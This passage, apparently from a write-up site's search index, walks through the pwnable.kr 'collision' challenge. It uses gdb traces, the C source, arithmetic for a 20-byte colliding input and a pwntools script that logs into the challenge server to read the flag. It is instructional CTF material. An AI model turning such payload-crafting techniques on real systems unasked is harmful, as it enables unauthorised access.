2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 threads \u2500\u2500\u2500\u2500 [#0] Id 1, Name: \"col\", stopped, reason: BREAKPOINT \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 trace \u2500\u2500\u2500\u2500 [#0] 0x5555555551b3 \u2192 main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 Then I set a breakpoint before the return instruction in check_password() and continued the execution : gef\u27a4 disas check_password Dump of assembler code for function check_password: 0x0000555555555165 <+0>: push rbp 0x0000555555555166 <+1>: mov rbp,rsp 0x0000555555555169 <+4>: mov QWORD PTR [rbp-0x18],rdi 0x000055555555516d <+8>: mov rax,QWORD PTR [rbp-0x18] 0x0000555555555171 <+12>: mov QWORD PTR [rbp-0x10],rax 0x0000555555555175 <+16>: mov DWORD PTR [rbp-0x8],0x0 0x000055555555517c <+23>: mov DWORD PTR [rbp-0x4],0x0 0x0000555555555183 <+30>: jmp 0x5555555551a2 <check_password+61> 0x0000555555555185 <+32>: mov eax,DWORD PTR [rbp-0x4] 0x0000555555555188 <+35>: cdqe 0x000055555555518a <+37>: lea rdx,[rax*4+0x0] 0x0000555555555192 <+45>: mov rax,QWORD PTR [rbp-0x10] 0x0000555555555196 <+49>: add rax,rdx 0x0000555555555199 <+52>: mov eax,DWORD PTR [rax] 0x000055555555519b <+54>: add DWORD PTR [rbp-0x8],eax 0x000055555555519e <+57>: add DWORD PTR [rbp-0x4],0x1 0x00005555555551a2 <+61>: cmp DWORD PTR [rbp-0x4],0x4 0x00005555555551a6 <+65>: jle 0x555555555185 <check_password+32> 0x00005555555551a8 <+67>: mov eax,DWORD PTR [rbp-0x8] 0x00005555555551ab <+70>: cdqe 0x00005555555551ad <+72>: pop rbp 0x00005555555551ae <+73>: ret End of assembler dump. gef\u27a4 break *0x00005555555551ae Breakpoint 2 at 0x5555555551ae gef\u27a4 c Continuing. Breakpoint 2, 0x00005555555551ae in check_password () [ Legend: Modified register | Code | Heap | Stack | String ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 registers \u2500\u2500\u2500\u2500 $rax : 0x46464645 $rbx : 0x0 $rcx : 0x6 $rdx : 0x10 $rsp : 0x00007fffffffe048 \u2192 0x0000555555555225 \u2192 <main+118> mov rdx, rax $rbp : 0x00007fffffffe060 \u2192 0x0000555555555260 \u2192 <__libc_csu_init+0> push r15 $rsi : 0x00007fffffffe148 \u2192 0x00007fffffffe44f \u2192 \"/root/Desktop/pwnable.kr/collision/col\" $rdi : 0x00007fffffffe476 \u2192 \"AAAAAAAAAAAAAAAAAAAA\" $rip : 0x00005555555551ae \u2192 <check_password+73> ret $r8 : 0x400 $r9 : 0x00007ffff7faad80 \u2192 0x0000000000000000 $r10 : 0xfffffffffffff479 $r11 : 0x00007ffff7e861e0 \u2192 <__strlen_sse2+0> pxor xmm0, xmm0 $r12 : 0x0000555555555080 \u2192 <_start+0> xor ebp, ebp $r13 : 0x00007fffffffe140 \u2192 0x0000000000000002 $r14 : 0x0 $r15 : 0x0 $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 stack \u2500\u2500\u2500\u2500 0x00007fffffffe048\u2502+0x0000: 0x0000555555555225 \u2192 <main+118> mov rdx, rax \u2190 $rsp 0x00007fffffffe050\u2502+0x0008: 0x00007fffffffe148 \u2192 0x00007fffffffe44f \u2192 \"/root/Desktop/pwnable.kr/collision/col\" 0x00007fffffffe058\u2502+0x0010: 0x0000000200000000 0x00007fffffffe060\u2502+0x0018: 0x0000555555555260 \u2192 <__libc_csu_init+0> push r15 \u2190 $rbp 0x00007fffffffe068\u2502+0x0020: 0x00007ffff7e1209b \u2192 <__libc_start_main+235> mov edi, eax 0x00007fffffffe070\u2502+0x0028: 0x0000000000000000 0x00007fffffffe078\u2502+0x0030: 0x00007fffffffe148 \u2192 0x00007fffffffe44f \u2192 \"/root/Desktop/pwnable.kr/collision/col\" 0x00007fffffffe080\u2502+0x0038: 0x0000000200040000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 code:x86:64 \u2500\u2500\u2500\u2500 0x5555555551a1 <check_password+60> add DWORD PTR [rbx+0x7e04fc7d], eax 0x5555555551a7 <check_password+66> fisttp QWORD PTR [rbx-0x67b707bb] 0x5555555551ad <check_password+72> pop rbp \u2192 0x5555555551ae <check_password+73> ret \u21b3 0x555555555225 <main+118> mov rdx, rax 0x555555555228 <main+121> mov rax, QWORD PTR [rip+0x2e19] # 0x555555558048 <hashcode> 0x55555555522f <main+128> cmp rdx, rax 0x555555555232 <main+131> jne 0x55555555524c <main+157> 0x555555555234 <main+133> lea rdi, [rip+0xe08] # 0x555555556043 0x55555555523b <main+140> mov eax, 0x0 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 threads \u2500\u2500\u2500\u2500 [#0] Id 1, Name: \"col\", stopped, reason: BREAKPOINT \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 trace \u2500\u2500\u2500\u2500 [#0] 0x5555555551ae \u2192 check_password() [#1] 0x555555555225 \u2192 main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 The return value of check_password() is saved in EAX we need it to be 568134124 : gef\u27a4 print $eax $1 = 0x46464645 gef\u27a4 set $eax=568134124 Now if we continue execution it should attempt to execute /bin/cat flag : gef\u27a4 c Continuing. [Detaching after fork from child process 3166] /bin/cat: flag: No such file or directory [Inferior 1 (process 3101) exited normally] gef\u27a4 Great, now we need to find out how to make check_password() return that value, let\u2019s look at the code. check_password() : unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i<5; i++){ res += ip[i]; } return res; } This function casts the given passcode ( p ) into integer, declares ip which is an array of pointers starting with the pointer to p , and declares an int variable called res and gives it a value of 0 then it loops 5 times through ip (because length of passcode is 20, 20/4 == 5 ) and adds each value to res , finally it returns res . In case you\u2019re confused, simply what happens is that it takes the given passcode which is 20 bytes length and divides it to 5 pieces (each piece 4 bytes) then it sums the decimal value of the 5 pieces and returns that value. For example the result of giving check_password() \u201cAAAAAAAAAAAAAAAAAAAA\u201d will be like this : \"AAAA\" + \"AAAA\" + \"AAAA\" + \"AAAA\" + \"AAAA\" 0x41414141 + 0x41414141 + 0x41414141 + 0x41414141 + 0x41414141 1094795585 + 1094795585 + 1094795585 + 1094795585 + 1094795585 res = 5473977925 To verify that I took the main code and added some printf statements, test code looks like this : #include <stdio.h> #include <string.h> unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i<5; i++){ res += ip[i]; printf(\"\\n--------------------------\\n\"); printf(\"loop : %i\\n\", i); printf(\"piece value : %i\\n\",ip[i] ); printf(\"\\n\"); } return res; } int main(int argc, char* argv[]){ if(argc<2){ printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\"passcode length should be 20 bytes\\n\"); return 0; } printf(\"hashcode : %i\\n\", hashcode); if(hashcode == check_password( argv[1] )){ system(\"/bin/cat flag\"); return 0; } else printf(\"wrong passcode.\\n\"); return 0; } Let\u2019s give it 20 A\u2019s : root@kali:~/Desktop/pwnable.kr/collision/test# ./test \"AAAAAAAAAAAAAAAAAAAA\" hashcode : 568134124 -------------------------- loop : 0 piece value : 1094795585 -------------------------- loop : 1 piece value : 1094795585 -------------------------- loop : 2 piece value : 1094795585 -------------------------- loop : 3 piece value : 1094795585 -------------------------- loop : 4 piece value : 1094795585 wrong passcode. You can see that the 5 pieces are of the same value which is the value of 0x41414141 (4 A\u2019s) : >>> 0x41414141 1094795585 And if we give it AAAABBBBCCCCDDDDEEEE : root@kali:~/Desktop/pwnable.kr/collision/test# ./test \"AAAABBBBCCCCDDDDEEEE\" hashcode : 568134124 -------------------------- loop : 0 piece value : 1094795585 -------------------------- loop : 1 piece value : 1111638594 -------------------------- loop : 2 piece value : 1128481603 -------------------------- loop : 3 piece value : 1145324612 -------------------------- loop : 4 piece value : 1162167621 wrong passcode. >>> 0x41414141 1094795585 >>> 0x42424242 1111638594 >>> 0x43434343 1128481603 >>> 0x44444444 1145324612 >>> 0x45454545 1162167621 Exploitation We need to come up with 5 pieces that add up to 568134124. We can divide the original value by 5 : >>> 568134124/5 113626824 But 568134124 isn\u2019t divisible by 5 : >>> 568134124%5 4 We can use 113626824 as the first 4 pieces, to get the last piece we will multiply 113626824 by 4 and subtract the result from 568134124 : >>> 113626824 * 4 454507296 >>> 568134124 - 454507296 113626828 What\u2019s left is to convert them to hex : >>> hex(113626824) '0x6c5cec8' >>> hex(113626828) '0x6c5cecc' And because it\u2019s little endian we will reverse the order, final payload will be : python -c 'print \"\\xc8\\xce\\xc5\\x06\" * 4 + \"\\xcc\\xce\\xc5\\x06\"' Let\u2019s test it : root@kali:~/Desktop/pwnable.kr/collision/test# ./test `python -c 'print \"\\xc8\\xce\\xc5\\x06\" * 4 + \"\\xcc\\xce\\xc5\\x06\"'` ip : 1329747125 -------------------------- loop : 0 piece value : 113626824 -------------------------- loop : 1 piece value : 113626824 -------------------------- loop : 2 piece value : 113626824 -------------------------- loop : 3 piece value : 113626824 -------------------------- loop : 4 piece value : 113626828 /bin/cat: flag: No such file or directory It works. And by the way what we did now is a hash collision , we made a hash function produce the same output for different inputs. I also wrote small python script using pwntools : #!/usr/bin/python from pwn import * payload = p32(0x6c5cec8) * 4 + p32(0x6c5cecc) r = ssh('col' ,'pwnable.kr' ,password='guest', port=2222) p = r.process(executable='./col', argv=['col',payload]) flag = p.recv() log.success(\"Flag: \" + flag) p.close() r.close() pwned ! That\u2019s it , Feedback is appreciated ! Don\u2019t forget to read the other write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3sham Thanks for reading. Reference Writeup from https://0xrick.github.io/pwn/collision/","title":"collision"},{"location":"Writeup/Binary%20Exploitation/collision/#collision","text":"Category: Binary Exploitation Source: pwnable.kr Author: unknown Score: 5","title":"collision"},{"location":"Writeup/Binary%20Exploitation/collision/#description","text":"Daddy told me about cool MD5 hash collision today. I wanna do something like that too! ssh col@pwnable.kr -p2222 (pw:guest)","title":"Description"},{"location":"Writeup/Binary%20Exploitation/collision/#introduction","text":"Hey guys this is my write-up for a challenge called collision from pwnable.kr . It\u2019s a very simple challenge, we need a password to make the program read the flag, the function that validates the given password is vulnerable to hash collision so we will exploit it. Challenge Description : Daddy told me about cool MD5 hash collision today. I wanna do something like that too! ssh col@pwnable.kr -p2222 (pw:guest)","title":"Introduction"},{"location":"Writeup/Binary%20Exploitation/collision/#code-analysis-tests","text":"col.c : #include <stdio.h> #include <string.h> unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i<5; i++){ res += ip[i]; } return res; } int main(int argc, char* argv[]){ if(argc<2){ printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\"passcode length should be 20 bytes\\n\"); return 0; } if(hashcode == check_password( argv[1] )){ system(\"/bin/cat flag\"); return 0; } else printf(\"wrong passcode.\\n\"); return 0; } main() : Starting by the main function it checks if we have given the program an input and it checks if our input\u2019s length is exactly 20 bytes. Then it checks if the return value of check_password(our input) is equal to hashcode , if we pass that check it will read the flag, otherwise it will print wrong passcode. and exit. int main(int argc, char* argv[]){ if(argc<2){ printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\"passcode length should be 20 bytes\\n\"); return 0; } if(hashcode == check_password( argv[1] )){ system(\"/bin/cat flag\"); return 0; } else printf(\"wrong passcode.\\n\"); return 0; } Looking up, we can see the declaration of the variable hashcode : unsigned long hashcode = 0x21DD09EC; That\u2019s a hex value, let\u2019s convert it to decimal with python : >>> 0x21DD09EC 568134124 So we need our input to be 20 bytes length and we also need to make the function check_password return 568134124 when our input is given to it. Let\u2019s quickly try to simulate that in gdb . I ran the program and set a breakpoint at main : gef\u27a4 break main Breakpoint 1 at 0x11b3 gef\u27a4 r \"AAAAAAAAAAAAAAAAAAAA\" Starting program: /root/Desktop/pwnable.kr/collision/col \"AAAAAAAAAAAAAAAAAAAA\" Breakpoint 1, 0x00005555555551b3 in main () [ Legend: Modified register | Code | Heap | Stack | String ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 registers \u2500\u2500\u2500\u2500 $rax : 0x00005555555551af \u2192 <main+0> push rbp $rbx : 0x0 $rcx : 0x00007ffff7fa9718 \u2192 0x00007ffff7faad80 \u2192 0x0000000000000000 $rdx : 0x00007fffffffe160 \u2192 0x00007fffffffe48b \u2192 \"SHELL=/bin/bash\" $rsp : 0x00007fffffffe060 \u2192 0x0000555555555260 \u2192 <__libc_csu_init+0> push r15 $rbp : 0x00007fffffffe060 \u2192 0x0000555555555260 \u2192 <__libc_csu_init+0> push r15 $rsi : 0x00007fffffffe148 \u2192 0x00007fffffffe44f \u2192 \"/root/Desktop/pwnable.kr/collision/col\" $rdi : 0x2 $rip : 0x00005555555551b3 \u2192 <main+4> sub rsp, 0x10 $r8 : 0x00007ffff7faad80 \u2192 0x0000000000000000 $r9 : 0x00007ffff7faad80 \u2192 0x0000000000000000 $r10 : 0x0 $r11 : 0x00007ffff7f6b1b0 \u2192 0x0000800003400468 $r12 : 0x0000555555555080 \u2192 <_start+0> xor ebp, ebp $r13 : 0x00007fffffffe140 \u2192 0x0000000000000002 $r14 : 0x0 $r15 : 0x0 $eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 stack \u2500\u2500\u2500\u2500 0x00007fffffffe060\u2502+0x0000: 0x0000555555555260 \u2192 <__libc_csu_init+0> push r15 \u2190 $rsp, $rbp 0x00007fffffffe068\u2502+0x0008: 0x00007ffff7e1209b \u2192 <__libc_start_main+235> mov edi, eax 